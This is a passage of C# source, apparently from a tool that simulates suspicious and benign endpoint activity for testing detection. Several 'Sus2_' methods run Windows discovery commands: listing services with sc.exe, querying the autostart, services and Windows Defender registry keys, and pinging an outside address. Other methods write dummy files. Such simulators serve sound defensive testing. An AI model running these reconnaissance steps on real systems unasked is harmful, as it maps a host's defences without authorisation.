        await Task.Delay(1000, ct);
    }

    static async Task Sus2_ServiceEnum(CancellationToken ct)
    {
        Log("Enumerating services via sc.exe...");
        await Spawn("sc.exe", "query", showWindow: false);
        await Task.Delay(1000, ct);
    }

    static async Task Sus2_RegistryQueries(CancellationToken ct)
    {
        string[] keys = {
            @"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
            @"HKLM\System\CurrentControlSet\Services",
            @"HKLM\Software\Microsoft\Windows Defender"
        };
        
        Log("Querying sensitive registry keys...");
        foreach(var key in keys)
        {
            ct.ThrowIfCancellationRequested();
            await Spawn("reg.exe", $"query \"{key}\"", showWindow: false);
            await Task.Delay(500, ct);
        }
    }

    static async Task Sus2_NetworkDiscovery(CancellationToken ct)
    {
        Log("Pinging broadcast/multiple local addresses...");
        await Spawn("ping.exe", "-n 4 8.8.8.8", showWindow: false);
        await Task.Delay(2000, ct);
    }

    static async Task Inc2_DbChurn(CancellationToken ct)
    {
        string dir = Path.Combine(Drop, "db_sim");
        Directory.CreateDirectory(dir);
        Log("Simulating application local DB transactions...");
        string dbFile = Path.Combine(dir, "local.db");
        await File.WriteAllTextAsync(dbFile, "SQLite format 3\0", ct);
        
        for (int i = 0; i < 15; i++)
        {
            ct.ThrowIfCancellationRequested();
            using (var fs = File.OpenWrite(dbFile))
            {
                fs.Seek(0, SeekOrigin.End);
                await fs.WriteAsync(Encoding.UTF8.GetBytes($"Transaction {i}\n"), ct);
            }
            await Task.Delay(100, ct);
        }
        Log("  DB Churn complete.");
    }

    static async Task Inc2_BrowserCache(CancellationToken ct)
    {
        string dir = Path.Combine(Drop, "browser_sim_cache");
        Directory.CreateDirectory(dir);
        Log("Simulating browser caching engine writes...");
        for (int i = 0; i < 20; i++)
        {
            ct.ThrowIfCancellationRequested();
            string p = Path.Combine(dir, $"f_{Guid.NewGuid().ToString().Substring(0, 8)}.tmp");
            await File.WriteAllTextAsync(p, $"CACHE_DATA_{i}", ct);
            await Task.Delay(50, ct);
        }
        Log("  Cache writes complete.");
    }
}
